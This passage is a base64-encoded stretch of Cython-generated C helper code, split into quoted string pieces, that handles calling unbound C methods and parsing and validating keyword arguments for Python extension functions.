mIF9fY3BsdXNwbHVzCiAgICAgICAgICAgIDAKI2VuZGlmCiAgICAgICAgfTsKICAgICAgICB0bXBfY2Z1bmMudHlwZSA9IGNmdW5jLT50eXBlOwogICAgICAgIHRtcF9jZnVuYy5tZXRob2RfbmFtZSA9IGNmdW5jLT5tZXRob2RfbmFtZTsKICAgICAgICByZXR1cm4gX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoJnRtcF9jZnVuYywgc2VsZiwgYXJnMSwgYXJnMik7CiAgICB9CiNlbmRpZgogICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKTsKICAgIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhjZnVuYyk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpewogICAgaWYgKHVubGlrZWx5KCFjZnVuYy0+ZnVuYyAmJiAhY2Z1bmMtPm1ldGhvZCkgJiYgdW5saWtlbHkoX19QeXhfVHJ5VW5wYWNrVW5ib3VuZENNZXRo""b2QoY2Z1bmMpIDwgMCkpIHJldHVybiBOVUxMOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBpZiAoY2Z1bmMtPmZ1bmMgJiYgKGNmdW5jLT5mbGFnICYgTUVUSF9WQVJBUkdTKSkgewogICAgICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMOwogICAgICAgIFB5T2JqZWN0ICphcmdzID0gUHlUdXBsZV9OZXcoMik7CiAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgUHlfSU5DUkVGKGFyZzEpOwogICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJncywgMCwgYXJnMSk7CiAgICAgICAgUHlfSU5DUkVGKGFyZzIpOwogICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJncywgMSwgYXJnMik7CiAgICAgICAgaWYgKGNmdW5jLT5mbGFnICYgTUVUSF9LRVlXT1JEUykKICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfQ2FsbENGdW5jdGlvbldpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgTlVMTCk7CiAgICAgICAgZWxzZQogICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKTsKICAgICAgICBQeV9ERUNSRUYoYXJncyk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2VuZGlmCiAgICB7CiAgICAgICAgUHlPYmplY3QgKmFyZ3NbNF0gPSB7TlVMTCwgc2VsZiwgYXJnMSwgYXJnMn07CiAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGNmdW5jLT5tZXRob2QsIGFyZ3MrMSwgMyB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7CiAgICB9Cn0KCgpzdGF0aWMgaW50IF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncygKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZSA9IGFyZ25hbWVzOwogICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7CiAgICAgICAgUHlPYmplY3QgKmtleSA9ICoqbmFtZTsKICAgICAgICBpbnQgZm91bmQgPSBQeURpY3RfQ29udGFpbnMoa3dkcywga2V5KTsKICAgICAgICBpZiAodW5saWtlbHkoZm91bmQpKSB7CiAgICAgICAgICAgIGlmIChmb3VuZCA9PSAxKSBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTsKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIHJldHVybiAwOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0KI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1VuaWNvZGVLZXl3b3Jkc0VxdWFsKFB5T2JqZWN0ICpzMSwgUHlPYmplY3QgKnMyKSB7CiAgICBpbnQga2luZDsKICAgIFB5X3NzaXplX3QgbGVuID0gUHlVbmljb2RlX0dFVF9MRU5HVEgoczEpOwogICAgaWYg""KGxlbiAhPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChzMikpIHJldHVybiAwOwogICAga2luZCA9IFB5VW5pY29kZV9LSU5EKHMxKTsKICAgIGlmIChraW5kICE9IFB5VW5pY29kZV9LSU5EKHMyKSkgcmV0dXJuIDA7CiAgICBjb25zdCB2b2lkICpkYXRhMSA9IFB5VW5pY29kZV9EQVRBKHMxKTsKICAgIGNvbnN0IHZvaWQgKmRhdGEyID0gUHlVbmljb2RlX0RBVEEoczIpOwogICAgcmV0dXJuIChtZW1jbXAoZGF0YTEsIGRhdGEyLCAoc2l6ZV90KSBsZW4gKiAoc2l6ZV90KSBraW5kKSA9PSAwKTsKfQojZW5kaWYKc3RhdGljIGludCBfX1B5eF9NYXRjaEtleXdvcmRBcmdfc3RyKAogICAgUHlPYmplY3QgKmtleSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgc2l6ZV90ICppbmRleF9mb3VuZCwKICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpCnsKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lOwogICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgIFB5X2hhc2hfdCBrZXlfaGFzaCA9ICgoUHlBU0NJSU9iamVjdCopa2V5KS0+aGFzaDsKICAgIGlmICh1bmxpa2VseShrZXlfaGFzaCA9PSAtMSkpIHsKICAgICAgICBrZXlfaGFzaCA9IFB5T2JqZWN0X0hhc2goa2V5KTsKICAgICAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gLTEpKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgICNlbmRpZgogICAgbmFtZSA9IGZpcnN0X2t3X2FyZzsKICAgIHdoaWxlICgqbmFtZSkgewogICAgICAgIFB5T2JqZWN0ICpuYW1lX3N0ciA9ICoqbmFtZTsKICAgICAgICAjaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICAgICAgIGlmIChrZXlfaGFzaCA9PSAoKFB5QVNDSUlPYmplY3QqKW5hbWVfc3RyKS0+aGFzaCAmJiBfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChuYW1lX3N0ciwga2V5KSkgewogICAgICAgICAgICAqaW5kZXhfZm91bmQgPSAoc2l6ZV90KSAobmFtZSAtIGFyZ25hbWVzKTsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgICNlbHNlCiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKFB5VW5pY29kZV9HRVRfTEVOR1RIKG5hbWVfc3RyKSA9PSBQeVVuaWNvZGVfR0VUX0xFTkdUSChrZXkpKQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgICAgaW50IGNtcCA9IFB5VW5pY29kZV9Db21wYXJlKG5hbWVfc3RyLCBrZXkpOwogICAgICAgICAgICBpZiAoY21wIDwgMCAmJiB1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7CiAgICAgICAgICAgIGlmIChjbXAgPT0gMCkgewogICAgICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7CiAgICAgICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICBuYW1lKys7CiAg""ICB9CiAgICBuYW1lID0gYXJnbmFtZXM7CiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHsKICAgICAgICBQeU9iamVjdCAqbmFtZV9zdHIgPSAqKm5hbWU7CiAgICAgICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgICAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2gpKSB7CiAgICAgICAgICAgIGlmIChfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChuYW1lX3N0ciwga2V5KSkKICAgICAgICAgICAgICAgIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTsKICAgICAgICB9CiAgICAgICAgI2Vsc2UKICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBpZiAoUHlVbmljb2RlX0dFVF9MRU5HVEgobmFtZV9zdHIpID09IFB5VW5pY29kZV9HRVRfTEVOR1RIKGtleSkpCiAgICAgICAgI2VuZGlmCiAgICAgICAgewogICAgICAgICAgICBpZiAodW5saWtlbHkobmFtZV9zdHIgPT0ga2V5KSkgZ290byBhcmdfcGFzc2VkX3R3aWNlOwogICAgICAgICAgICBpbnQgY21wID0gUHlVbmljb2RlX0NvbXBhcmUobmFtZV9zdHIsIGtleSk7CiAgICAgICAgICAgIGlmIChjbXAgPCAwICYmIHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBnb3RvIGJhZDsKICAgICAgICAgICAgaWYgKGNtcCA9PSAwKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIHJldHVybiAwOwphcmdfcGFzc2VkX3R3aWNlOgogICAgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICBnb3RvIGJhZDsKYmFkOgogICAgcmV0dXJuIC0xOwp9CnN0YXRpYyBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX25vc3RyKAogICAgUHlPYmplY3QgKmtleSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgc2l6ZV90ICppbmRleF9mb3VuZCwKICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpCnsKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lOwogICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIGdvdG8gaW52YWxpZF9rZXl3b3JkX3R5cGU7CiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgd2hpbGUgKCpuYW1lKSB7CiAgICAgICAgaW50IGNtcCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCgqKm5hbWUsIGtleSwgUHlfRVEpOwogICAgICAgIGlmIChjbXAgPT0gMSkgewogICAgICAgICAgICAqaW5kZXhfZm91bmQgPSAoc2l6ZV90KSAobmFtZSAtIGFyZ25hbWVzKTsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIGlmICh1bmxpa2VseShjbXAgPT0gLTEpKSBnb3RvIGJhZDsKICAgICAgICBuYW1lKys7CiAgICB9CiAgICBuYW1lID0gYXJnbmFtZXM7CiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHsKICAg""ICAgICBpbnQgY21wID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKCoqbmFtZSwga2V5LCBQeV9FUSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGNtcCAhPSAwKSkgewogICAgICAgICAgICBpZiAoY21wID09IDEpIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTsKICAgICAgICAgICAgZWxzZSBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgbmFtZSsrOwogICAgfQogICAgcmV0dXJuIDA7CmFyZ19wYXNzZWRfdHdpY2U6CiAgICBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTsKICAgIGdvdG8gYmFkOwppbnZhbGlkX2tleXdvcmRfdHlwZToKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwcygpIGtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIsIGZ1bmN0aW9uX25hbWUpOwogICAgZ290byBiYWQ7CmJhZDoKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnKAogICAgUHlPYmplY3QgKmtleSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgc2l6ZV90ICppbmRleF9mb3VuZCwKICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpCnsKICAgIHJldHVybiBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3Qoa2V5KSkgPwogICAgICAgIF9fUHl4X01hdGNoS2V5d29yZEFyZ19zdHIoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSkgOgogICAgICAgIF9fUHl4X01hdGNoS2V5d29yZEFyZ19ub3N0cihrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTsKfQpzdGF0aWMgdm9pZCBfX1B5eF9SZWplY3RVbmtub3duS2V5d29yZCgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICBQeV9zc2l6ZV90IHBvcyA9IDA7CiAgICBQeU9iamVjdCAqa2V5ID0gTlVMTDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oa3dkcyk7CiAgICB3aGlsZSAoUHlEaWN0X05leHQoa3dkcywgJnBvcywgJmtleSwgTlVMTCkpIHsKICAgICAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgICAgIHdoaWxlICgqbmFtZSAmJiAoKipuYW1lICE9IGtleSkpIG5hbWUrKzsKICAgICAgICBpZiAoISpuYW1lKSB7CiAgICAgICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICBQeV9JTkNSRUYoa2V5KTsKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIHNpemVfdCBpbmRleF9mb3VuZCA9IDA7CiAgICAgICAgICAgIGludCBjbXAgPSBfX1B5eF9NYXRjaEtleXdvcmRBcmcoa2V5LCBhcmduYW1lcywgZmly""c3Rfa3dfYXJnLCAmaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpOwogICAgICAgICAgICBpZiAoY21wICE9IDEpIHsKICAgICAgICAgICAgICAgIGlmIChjbXAgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICIlcygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgJyVVJyIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgUHlfREVDUkVGKGtleSk7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICBhc3NlcnQoUHlFcnJfT2NjdXJyZWQoKSk7Cn0Kc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0KAogICAgUHlPYmplY3QgKmt3ZHMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncykKewogICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZTsKICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzOwogICAgUHlfc3NpemVfdCBleHRyYWN0ZWQgPSAwOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBkZWZpbmVkKFB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cykKICAgIGlmICh1bmxpa2VseSghUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKGt3ZHMpKSkgcmV0dXJuIC0xOwojZW5kaWYKICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICB3aGlsZSAoKm5hbWUgJiYgbnVtX2t3YXJncyA+IGV4dHJhY3RlZCkgewogICAgICAgIFB5T2JqZWN0ICoga2V5ID0gKipuYW1lOwogICAgICAgIFB5T2JqZWN0ICp2YWx1ZTsKICAgICAgICBpbnQgZm91bmQgPSAwOwogICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgICAgICBmb3VuZCA9IFB5RGljdF9HZXRJdGVtUmVmKGt3ZHMsIGtleSwgJnZhbHVlKTsKICAgICAgICAjZWxzZQogICAgICAgIHZhbHVlID0gUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3Ioa3dkcywga2V5KTsKICAgICAgICBpZiAodmFsdWUpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAgICAgZm91bmQgPSAxOwogICAg""ICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIGlmIChmb3VuZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7CiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlOwogICAgICAgICAgICBleHRyYWN0ZWQrKzsKICAgICAgICB9CiAgICAgICAgbmFtZSsrOwogICAgfQogICAgaWYgKG51bV9rd2FyZ3MgPiBleHRyYWN0ZWQpIHsKICAgICAgICBpZiAoaWdub3JlX3Vua25vd25fa3dhcmdzKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3Moa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSkgPT0gLTEpKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgX19QeXhfUmVqZWN0VW5rbm93bktleXdvcmQoa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSk7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAwOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0Kc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0VG9EaWN0KAogICAgUHlPYmplY3QgKmt3ZHMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKmt3ZHMyLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lOwogICAgUHlPYmplY3QqKiBjb25zdCAqZmlyc3Rfa3dfYXJnID0gYXJnbmFtZXMgKyBudW1fcG9zX2FyZ3M7CiAgICBQeV9zc2l6ZV90IGxlbjsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgZGVmaW5lZChQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMpCiAgICBpZiAodW5saWtlbHkoIVB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cyhrd2RzKSkpIHJldHVybiAtMTsKI2VuZGlmCiAgICBpZiAoUHlEaWN0X1VwZGF0ZShrd2RzMiwga3dkcykgPCAwKSBnb3RvIGJhZDsKICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICB3aGlsZSAoKm5hbWUpIHsKICAgICAgICBQeU9iamVjdCAqa2V5ID0gKipuYW1lOwogICAgICAgIFB5T2JqZWN0ICp2YWx1ZTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEEyIHx8IGRlZmluZWQoUHlEaWN0X1BvcCkpCiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X1BvcChrd2RzMiwga2V5LCAmdmFsdWUpOwogICAgICAgIGlmIChmb3VuZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7CiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVz""XSA9IHZhbHVlOwogICAgICAgIH0KI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X0dldEl0ZW1SZWYoa3dkczIsIGtleSwgJnZhbHVlKTsKICAgICAgICBpZiAoZm91bmQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9EZWxJdGVtKGt3ZHMyLCBrZXkpIDwgMCkpIGdvdG8gYmFkOwogICAgICAgIH0KI2Vsc2UKICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICB2YWx1ZSA9IF9QeURpY3RfUG9wKGt3ZHMyLCBrZXksIGt3ZHMyKTsKICAgICNlbHNlCiAgICAgICAgdmFsdWUgPSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcCwga3dkczIsIGtleSwga3dkczIpOwogICAgI2VuZGlmCiAgICAgICAgaWYgKHZhbHVlID09IGt3ZHMyKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2YWx1ZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICB9CiNlbmRpZgogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIGxlbiA9IFB5RGljdF9TaXplKGt3ZHMyKTsKICAgIGlmIChsZW4gPiAwKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncyhrd2RzLCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBmdW5jdGlvbl9uYW1lKTsKICAgIH0gZWxzZSBpZiAodW5saWtlbHkobGVuID09IC0xKSkgewogICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgcmV0dXJuIDA7CmJhZDoKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZHNUdXBsZSgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiBjb25zdCAqa3d2YWx1ZXMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKmt3ZHMyLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncykKewogICAgUHlPYmplY3QgKmtleSA9IE5VTEw7CiAgICBQeU9iamVjdCoqIGNvbnN0ICogbmFtZTsKICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzOwogICAgZm9yIChQeV9zc2l6ZV90IHBvcyA9IDA7IHBvcyA8IG51bV9rd2FyZ3M7IHBvcysrKSB7CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIGtleSA9IF9fUHl4X1B5U2Vx""dWVuY2VfSVRFTShrd2RzLCBwb3MpOwojZWxzZQogICAgICAgIGtleSA9IF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oa3dkcywgcG9zKTsKI2VuZGlmCiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIGlmICh1bmxpa2VseSgha2V5KSkgZ290byBiYWQ7CiNlbmRpZgogICAgICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICAgICAgd2hpbGUgKCpuYW1lICYmICgqKm5hbWUgIT0ga2V5KSkgbmFtZSsrOwogICAgICAgIGlmICgqbmFtZSkgewogICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSBfX1B5eF9OZXdSZWYodmFsdWUpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHNpemVfdCBpbmRleF9mb3VuZCA9IDA7CiAgICAgICAgICAgIGludCBjbXAgPSBfX1B5eF9NYXRjaEtleXdvcmRBcmcoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCAmaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpOwogICAgICAgICAgICBpZiAoY21wID09IDEpIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107CiAgICAgICAgICAgICAgICB2YWx1ZXNbaW5kZXhfZm91bmRdID0gX19QeXhfTmV3UmVmKHZhbHVlKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShjbXAgPT0gLTEpKSBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIGlmIChrd2RzMikgewogICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107CiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtKGt3ZHMyLCBrZXksIHZhbHVlKSkpIGdvdG8gYmFkOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICghaWdub3JlX3Vua25vd25fa3dhcmdzKSB7CiAgICAgICAgICAgICAgICAgICAgZ290byBpbnZhbGlkX2tleXdvcmQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgUHlfREVDUkVGKGtleSk7CiAgICAgICAga2V5ID0gTlVMTDsKICAgICAgICAjZW5kaWYKICAgIH0KICAgIHJldHVybiAwOwppbnZhbGlkX2tleXdvcmQ6C